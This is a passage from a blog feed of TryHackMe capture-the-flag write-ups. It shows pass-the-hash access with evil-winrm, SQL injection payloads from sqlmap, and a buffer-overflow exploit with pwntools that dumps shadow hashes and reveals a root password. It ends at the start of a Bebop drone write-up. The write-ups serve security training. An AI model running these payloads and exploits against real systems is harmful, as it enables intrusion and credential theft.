Successfully installed httpclient-2.8.3
Fetching: multi_json-1.14.1.gem (100%)
Successfully installed multi_json-1.14.1
Fetching: little-plugger-1.1.4.gem (100%)
Successfully installed little-plugger-1.1.4
Fetching: logging-2.2.2.gem (100%)
Successfully installed logging-2.2.2
Fetching: nori-2.6.0.gem (100%)
Successfully installed nori-2.6.0
Fetching: rubyntlm-0.6.2.gem (100%)
Successfully installed rubyntlm-0.6.2
Fetching: winrm-2.3.4.gem (100%)
Successfully installed winrm-2.3.4
Fetching: winrm-fs-1.3.4.gem (100%)
Successfully installed winrm-fs-1.3.4
Fetching: stringio-0.1.0.gem (100%)
Building native extensions. This could take a while...
Successfully installed stringio-0.1.0
Fetching: evil-winrm-2.3.gem (100%)
Happy hacking! :)
Successfully installed evil-winrm-2.3
Parsing documentation for builder-3.2.4
Installing ri documentation for builder-3.2.4
Parsing documentation for erubi-1.9.0
Installing ri documentation for erubi-1.9.0
Parsing documentation for gssapi-1.3.0
Installing ri documentation for gssapi-1.3.0
Parsing documentation for gyoku-1.3.1
Installing ri documentation for gyoku-1.3.1
Parsing documentation for httpclient-2.8.3
Installing ri documentation for httpclient-2.8.3
Parsing documentation for multi_json-1.14.1
Installing ri documentation for multi_json-1.14.1
Parsing documentation for little-plugger-1.1.4
Installing ri documentation for little-plugger-1.1.4
Parsing documentation for logging-2.2.2
Installing ri documentation for logging-2.2.2
Parsing documentation for nori-2.6.0
Installing ri documentation for nori-2.6.0
Parsing documentation for rubyntlm-0.6.2
Installing ri documentation for rubyntlm-0.6.2
Parsing documentation for winrm-2.3.4
Installing ri documentation for winrm-2.3.4
Parsing documentation for winrm-fs-1.3.4
Installing ri documentation for winrm-fs-1.3.4
Parsing documentation for stringio-0.1.0
Installing ri documentation for stringio-0.1.0
Parsing documentation for evil-winrm-2.3
Installing ri documentation for evil-winrm-2.3
Done installing documentation for builder, erubi, gssapi, gyoku, httpclient, multi_json, little-plugger, logging, nori, rubyntlm, winrm, winrm-fs, stringio, evil-winrm after 6 seconds
14 gems installed
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# evil-winrm -i 10.10.237.175 -u Administrator -H e48xxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
thm-ad\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And here we go Administrator user, there isn't much we can't do now ... &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/8EmeieJAGjvUI" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/work-homer-simpson-8EmeieJAGjvUI"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/ropnop/kerbrute"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;ropnop/kerbrute&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A tool to perform Kerberos pre-auth bruteforcing. Contribute to ropnop/kerbrute development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;ropnop&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars2.githubusercontent.com/u/2555506?s=400&amp;amp;v=4" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/Hackplayers/evil-winrm"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Hackplayers/evil-winrm&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;The ultimate WinRM shell for hacking/pentesting. Contribute to Hackplayers/evil-winrm development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Hackplayers&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://repository-images.githubusercontent.com/189010173/9da36880-c2d7-11e9-8037-2feff48b35d9" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/SecureAuthCorp/impacket"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;SecureAuthCorp/impacket&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Impacket is a collection of Python classes for working with network protocols. - SecureAuthCorp/impacket&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;SecureAuthCorp&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars2.githubusercontent.com/u/9470173?s=400&amp;amp;v=4" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/attacktivedirectory"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Attacktive Directory&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62d83f3931e968e92e06138a72ce44f0.png" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>thecodcaper CTF | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope&lt;/p&gt;</description><link>http://localhost:2368/thecodca/</link><guid isPermaLink="false">5e90424a5e61514e230adc77</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 14 Apr 2020 18:52:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/pgn.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/pgn.png" alt="thecodcaper CTF | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.201.143
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
Host is up (0.0018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:8C:7D:6E:AC:54 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.201.143/ -w /usr/share/dirb/wordlists/big.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.143/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/10 09:53:19 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/administrator.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/10 09:53:22 Finished
===============================================================
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -r request.txt --dbs
        ___
       __H__                                                                        
 ___ ___["]_____ ___ ___  {1.4#stable}                                              
|_ -| . [)]     | .'| . |                                                           
|___|_  [)]_|_|_|__,|  _|                                                           
      |_|V...       |_|   http://sqlmap.org                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:02:28 /2020-04-10/

[10:02:28] [INFO] parsing HTTP request from 'request.txt'
[10:02:28] [INFO] resuming back-end DBMS 'mysql' 
[10:02:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (7708=7708) THEN 0x61646d696e ELSE 0x28 END))-- MUAf&amp;amp;password=pass

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 1403 FROM(SELECT COUNT(*),CONCAT(0x71706a6271,(SELECT (ELT(1403=1403,1))),0x716b627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- staB&amp;amp;password=pass

    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3219 FROM (SELECT(SLEEP(5)))CJGe)-- kkog&amp;amp;password=pass
---
[10:02:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &amp;gt;= 5.0
[10:02:28] [INFO] fetching database names
[10:02:28] [INFO] used SQL query returns 5 entries
[10:02:28] [INFO] resumed: 'information_schema'
[10:02:28] [INFO] resumed: 'mysql'
[10:02:28] [INFO] resumed: 'performance_schema'
[10:02:28] [INFO] resumed: 'sys'
[10:02:28] [INFO] resumed: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[10:02:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.201.143'                                                                          
[10:02:28] [WARNING] you haven't updated sqlmap for more than 99 days!!!

[*] ending @ 10:02:28 /2020-04-10/

root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user &lt;strong&gt;www-data&lt;/strong&gt;, we definitely can do something about it.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after digging a little bit, I found the &lt;strong&gt;SSH&lt;/strong&gt; private key to the user in the machine, thought why not! let's enter from the front door.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# vim id_rsa
root@kali:~# locate ssh2john
/usr/share/john/ssh2john.py
root@kali:~# /usr/share/john/ssh2john.py id_rsa 
id_rsa has no password!
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Great! no password &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a &lt;strong&gt;REVERSE SHELL&lt;/strong&gt; from the command prompt!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;so I managed to make a simple one with &lt;strong&gt;echo&lt;/strong&gt; in the &lt;strong&gt;/tmp&lt;/strong&gt; file, I managed to run it, and get a reverse shell from the user &lt;strong&gt;www-data&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used &lt;strong&gt;&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;LinPEAS&lt;/a&gt;&lt;/strong&gt; which is the new version of &lt;strong&gt;LinEnum&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;we found an interesting file called &lt;strong&gt;root&lt;/strong&gt; in &lt;strong&gt;/opt/secret/&lt;/strong&gt; and as explained by the CTF maker,&lt;strong&gt;"&lt;/strong&gt; The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.&lt;/p&gt;&lt;p&gt;Run &lt;code&gt;gdb /opt/secret/root&lt;/code&gt; and you should see a screen similar to this&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type &lt;code&gt;r &amp;lt; &amp;lt;(cyclic 50)&lt;/code&gt;, that command runs the program and provides 50 characters worth of "cyclic" input.&lt;/p&gt;&lt;p&gt;Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.&lt;/p&gt;&lt;p&gt;Once you run that command you should see something similar to this screen&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.&lt;/p&gt;&lt;p&gt;Running &lt;code&gt;cyclic -l 0x6161616c&lt;/code&gt; outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.&lt;br&gt;That's all we needed for pre-explotation!&lt;/p&gt;&lt;p&gt;Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!&lt;br&gt;Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.&lt;/p&gt;&lt;p&gt;Method 1 - Manual conversion:&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"'&lt;/code&gt; will output the payload we want, but it requires manually converting to little endian&lt;/p&gt;&lt;p&gt;Method 2 - Struct:&lt;br&gt;&lt;code&gt;python -c 'import struct;print "A"*44 + struct.pack("&amp;lt;I",0x080484cb")'&lt;/code&gt;&lt;br&gt;It requires importing a module but struct.pack allows us to automatically convert memory to little endian. &lt;br&gt;We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root&lt;/code&gt;&lt;br&gt;should provide you with this output.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
&amp;lt;$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root          
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Illegal instruction
www-data@ubuntu:/opt/secret$ su root
su root
Password: love2fish

root@ubuntu:/opt/secret#id
uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.&lt;br&gt;We start off the script with:&lt;/p&gt;&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.&lt;/p&gt;&lt;p&gt;We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.&lt;br&gt;With the ELF addition our script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().&lt;/p&gt;&lt;p&gt;fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our &lt;code&gt;proc&lt;/code&gt; variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.&lt;br&gt;With all that our final exploit script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;&lt;code&gt;payload = fit({&lt;/code&gt;&lt;br&gt;&lt;code&gt;44: shell_func # this adds the value of shell_func after 44 characters&lt;/code&gt;&lt;br&gt;&lt;code&gt;})&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.sendline(payload)&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.interactive()&lt;/code&gt;&lt;br&gt;Save that to a .py file and run it, and you should get this output:&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&lt;/code&gt;&lt;strong&gt;"&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | The Cod Caper&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A guided room taking you through infiltrating and exploiting a Linux system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>bebop | drone lovers CTF</title><description>&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking&lt;/p&gt;</description><link>http://localhost:2368/bebop-drone-lovers-ctf/</link><guid isPermaLink="false">5e949d57e69fa94385575c33</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Mon, 13 Apr 2020 17:23:33 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Dr63yPm.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Dr63yPm.png" alt="bebop | drone lovers CTF"&gt;&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking my neighbour's kids cruddy drone offline", feel free to give it a check, the talk carries a lot of good information.&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;iframe width="480" height="270" src="https://www.youtube.com/embed/5CzURm7OpAA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;blockquote&gt;Let's start with some enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.116.147
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-13 17:15 UTC
Nmap scan report for ip-10-10-116-147.eu-west-1.compute.internal (10.10.116.147)
Host is up (0.00032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
MAC Address: 02:17:77:E9:CA:4E (Unknown)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Telnet to the machine no credentials needed and the username is provided in the challenge.&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# telnet 10.10.116.147
Trying 10.10.116.147...
